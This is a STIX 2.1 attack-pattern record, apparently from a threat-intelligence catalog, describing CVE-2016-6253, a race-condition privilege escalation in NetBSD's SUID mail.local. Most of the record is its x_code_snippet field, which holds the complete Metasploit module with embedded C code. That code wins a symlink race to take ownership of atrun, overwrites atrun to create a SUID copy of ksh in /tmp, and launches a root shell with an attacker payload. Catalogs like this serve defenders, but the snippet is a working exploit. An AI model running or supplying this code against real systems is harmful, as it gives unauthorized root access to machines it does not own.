{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1b16292c-7e2f-4b4b-b381-a8165554e86c",
    "created": "2024-08-14T17:14:28.785843Z",
    "modified": "2024-08-14T17:14:28.785847Z",
    "name": "NetBSD mail.local Privilege Escalation",
    "description": " This module attempts to exploit a race condition in mail.local with SUID bit set on: NetBSD 7.0 - 7.0.1 (verified on 7.0.1) NetBSD 6.1 - 6.1.5 NetBSD 6.0 - 6.0.6 Successful exploitation relies on a crontab job with root privilege, which may take up to 10min to execute.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/local/netbsd_mail_local.rb",
            "external_id": "netbsd_mail_local.rb"
        },
        {
            "source_name": "reference",
            "url": "http://akat1.pl/?id=2"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6253"
        },
        {
            "source_name": "reference",
            "url": "http://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2016-006.txt.asc"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'NetBSD mail.local Privilege Escalation',\n        'Description' => %q{\n          This module attempts to exploit a race condition in mail.local with SUID bit set on:\n          NetBSD 7.0 - 7.0.1 (verified on 7.0.1)\n          NetBSD 6.1 - 6.1.5\n          NetBSD 6.0 - 6.0.6\n          Successful exploitation relies on a crontab job with root privilege, which may take up to 10min to execute.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die <mike@shorebreaksecurity.com>', # Module\n          'akat1' # Discovery\n        ],\n\n        'DisclosureDate' => '2016-07-07',\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'SessionTypes' => %w[shell meterpreter],\n        'Privileged' => true,\n        'Payload' => {\n          'Compat' => {\n            'PayloadType' => 'cmd',\n            'RequiredCmd' => 'generic openssl'\n          }\n        },\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => { 'WfsDelay' => 603 }, # can take 10min for cron to kick\n        'References' => [\n          [ 'URL', 'http://akat1.pl/?id=2'],\n          [ 'EDB', '40141'],\n          [ 'CVE', '2016-6253'],\n          [ 'URL', 'http://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2016-006.txt.asc']\n        ],\n        'Notes' => {\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [OS_RESOURCE_LOSS],\n          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]\n        }\n      )\n    )\n    register_options([\n      OptString.new('ATRUNPATH', [true, 'Location of atrun binary', '/usr/libexec/atrun']),\n      OptString.new('MAILDIR', [true, 'Location of mailboxes', '/var/mail']),\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),\n      OptInt.new('ListenerTimeout', [true, 'Number of seconds to wait for the exploit', 603])\n    ])\n  end\n\n  def exploit\n    # lots of this file's format is based on pkexec.rb\n\n    # direct copy of code from exploit-db\n    main = %q{\n  // Source: http://akat1.pl/?id=2\n\n  #include <stdio.h>\n  #include <unistd.h>\n  #include <fcntl.h>\n  #include <signal.h>\n  #include <stdlib.h>\n  #include <string.h>\n  #include <err.h>\n  #include <sys/wait.h>\n\n  #define ATRUNPATH \"/usr/libexec/atrun\"\n  #define MAILDIR \"/var/mail\"\n\n  static int\n  overwrite_atrun(void)\n  {\n    char *script = \"#! /bin/sh\\n\"\n    \"cp /bin/ksh /tmp/ksh\\n\"\n    \"chmod +s /tmp/ksh\\n\";\n    size_t size;\n    FILE *fh;\n    int rv = 0;\n\n    fh = fopen(ATRUNPATH, \"wb\");\n\n    if (fh == NULL) {\n      rv = -1;\n      goto out;\n    }\n\n    size = strlen(script);\n    if (size != fwrite(script, 1, strlen(script), fh)) {\n      rv =  -1;\n      goto out;\n    }\n\n  out:\n    if (fh != NULL && fclose(fh) != 0)\n      rv = -1;\n\n      return rv;\n  }\n\n  static int\n  copy_file(const char *from, const char *dest, int create)\n  {\n    char buf[1024];\n    FILE *in = NULL, *out = NULL;\n    size_t size;\n    int rv = 0, fd;\n\n    in = fopen(from, \"rb\");\n    if (create == 0)\n      out = fopen(dest, \"wb\");\n    else {\n      fd = open(dest, O_WRONLY | O_EXCL | O_CREAT, S_IRUSR | S_IWUSR);\n      if (fd == -1) {\n        rv = -1;\n        goto out;\n      }\n      out = fdopen(fd, \"wb\");\n    }\n\n    if (in == NULL || out == NULL) {\n      rv = -1;\n      goto out;\n    }\n\n    while ((size = fread(&buf, 1, sizeof(buf), in)) > 0) {\n      if (fwrite(&buf, 1, size, in) != 0) {\n        rv = -1;\n        goto out;\n      }\n    }\n\n  out:\n    if (in != NULL && fclose(in) != 0)\n      rv = -1;\n    if (out != NULL && fclose(out) != 0)\n      rv = -1;\n    return rv;\n  }\n\n  int\n  main()\n  {\n    pid_t pid;\n    uid_t uid;\n    struct stat sb;\n    char *login, *mailbox, *mailbox_backup = NULL, *atrun_backup, *buf;\n\n    umask(0077);\n\n    login = getlogin();\n\n    if (login == NULL)\n      err(EXIT_FAILURE, \"who are you?\");\n\n      uid = getuid();\n\n      asprintf(&mailbox, MAILDIR \"/%s\", login);\n\n      if (mailbox == NULL)\n        err(EXIT_FAILURE, NULL);\n\n      if (access(mailbox, F_OK) != -1) {\n        /* backup mailbox */\n        asprintf(&mailbox_backup, \"/tmp/%s\", login);\n        if (mailbox_backup == NULL)\n          err(EXIT_FAILURE, NULL);\n      }\n\n      if (mailbox_backup != NULL) {\n        fprintf(stderr, \"[+] backup mailbox %s to %s\\n\", mailbox, mailbox_backup);\n          if (copy_file(mailbox, mailbox_backup, 1))\n            err(EXIT_FAILURE, \"[-] failed\");\n      }\n\n      /* backup atrun(1) */\n      atrun_backup = strdup(\"/tmp/atrun\");\n      if (atrun_backup == NULL)\n        err(EXIT_FAILURE, NULL);\n\n      fprintf(stderr, \"[+] backup atrun(1) %s to %s\\n\", ATRUNPATH, atrun_backup);\n\n      if (copy_file(ATRUNPATH, atrun_backup, 1))\n        err(EXIT_FAILURE, \"[-] failed\");\n\n      /* win the race */\n      fprintf(stderr, \"[+] try to steal %s file\\n\", ATRUNPATH);\n\n      switch (pid = fork()) {\n      case -1:\n        err(EXIT_FAILURE, NULL);\n        /* NOTREACHED */\n      case 0:\n        asprintf(&buf, \"echo x | /usr/libexec/mail.local -f xxx %s \"\n          \"2> /dev/null\", login);\n\n        for(;;)\n          system(buf);\n        /* NOTREACHED */\n\n      default:\n        umask(0022);\n        for(;;) {\n          int fd;\n          unlink(mailbox);\n          symlink(ATRUNPATH, mailbox);\n          sync();\n          unlink(mailbox);\n          fd = open(mailbox, O_CREAT, S_IRUSR | S_IWUSR);\n          close(fd);\n          sync();\n          if (lstat(ATRUNPATH, &sb) == 0) {\n            if (sb.st_uid == uid) {\n              kill(pid, 9);\n              fprintf(stderr, \"[+] won race!\\n\");\n              break;\n            }\n          }\n        }\n        break;\n      }\n      (void)waitpid(pid, NULL, 0);\n\n      if (mailbox_backup != NULL) {\n        /* restore mailbox */\n        fprintf(stderr, \"[+] restore mailbox %s to %s\\n\", mailbox_backup, mailbox);\n\n        if (copy_file(mailbox_backup, mailbox, 0))\n          err(EXIT_FAILURE, \"[-] failed\");\n        if (unlink(mailbox_backup) != 0)\n          err(EXIT_FAILURE, \"[-] failed\");\n      }\n\n      /* overwrite atrun */\n      fprintf(stderr, \"[+] overwriting atrun(1)\\n\");\n\n      if (chmod(ATRUNPATH, 0755) != 0)\n        err(EXIT_FAILURE, NULL);\n\n      if (overwrite_atrun())\n        err(EXIT_FAILURE, NULL);\n\n      fprintf(stderr, \"[+] waiting for atrun(1) execution...\\n\");\n\n      for(;;sleep(1)) {\n        if (access(\"/tmp/ksh\", F_OK) != -1)\n          break;\n      }\n\n      /* restore atrun */\n      fprintf(stderr, \"[+] restore atrun(1) %s to %s\\n\", atrun_backup, ATRUNPATH);\n\n      if (copy_file(atrun_backup, ATRUNPATH, 0))\n        err(EXIT_FAILURE, \"[-] failed\");\n      if (unlink(atrun_backup) != 0)\n        err(EXIT_FAILURE, \"[-] failed\");\n\n      if (chmod(ATRUNPATH, 0555) != 0)\n        err(EXIT_FAILURE, NULL);\n\n      fprintf(stderr, \"[+] done! Don't forget to change atrun(1) \"\n        \"ownership.\\n\");\n      fprintf(stderr, \"Enjoy your shell:\\n\");\n\n      execl(\"/tmp/ksh\", \"ksh\", NULL);\n\n      return 0;\n  }\n}\n    # patch in our variable maildir and atrunpath\n    main.gsub!(%r{#define ATRUNPATH \"/usr/libexec/atrun\"},\n               \"#define ATRUNPATH \\\"#{datastore['ATRUNPATH']}\\\"\")\n    main.gsub!(%r{#define MAILDIR \"/var/mail\"},\n               \"#define MAILDIR \\\"#{datastore['MAILDIR']}\\\"\")\n\n    executable_path = \"#{datastore['WritableDir']}/#{rand_text_alpha(8)}\"\n    payload_file = rand_text_alpha(8).to_s\n    payload_path = \"#{datastore['WritableDir']}/#{payload_file}\"\n    vprint_status(\"Writing Payload to #{payload_path}\")\n    # patch in to run our payload as part of ksh\n    main.gsub!(%r{execl\\(\"/tmp/ksh\", \"ksh\", NULL\\);},\n               \"execl(\\\"/tmp/ksh\\\", \\\"ksh\\\", \\\"#{payload_path}\\\", NULL);\")\n\n    write_file(payload_path, payload.encoded)\n    cmd_exec(\"chmod 555 #{payload_path}\")\n    register_file_for_cleanup(payload_path)\n\n    print_status \"Writing exploit to #{executable_path}.c\"\n\n    # clean previous bad attempts to prevent c code from exiting\n    rm_f executable_path\n    rm_f '/tmp/atrun'\n    whoami = cmd_exec('whoami')\n    rm_f \"/tmp/#{whoami}\"\n\n    write_file(\"#{executable_path}.c\", main)\n    print_status(\"Compiling #{executable_path}.c via gcc\")\n    output = cmd_exec(\"/usr/bin/gcc -o #{executable_path}.out #{executable_path}.c\")\n    output.each_line { |line| vprint_status(line.chomp) }\n\n    print_status('Starting the payload handler...')\n    handler({})\n\n    print_status(\"Executing at #{Time.now}.  May take up to 10min for callback\")\n    output = cmd_exec(\"chmod +x #{executable_path}.out; #{executable_path}.out\")\n    output.each_line { |line| vprint_status(line.chomp) }\n\n    # our sleep timer\n    stime = Time.now.to_f\n    Rex.sleep(1) until session_created? || stime + datastore['ListenerTimeout'] < Time.now.to_f\n    print_status(Time.now.to_s)\n    register_file_for_cleanup(executable_path)\n    register_file_for_cleanup(\"#{executable_path}.out\")\n    print_status(\"Remember to run: chown root:wheel #{datastore['ATRUNPATH']}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-07-07",
    "x_mitre_platforms": [
        "unix'"
    ]
}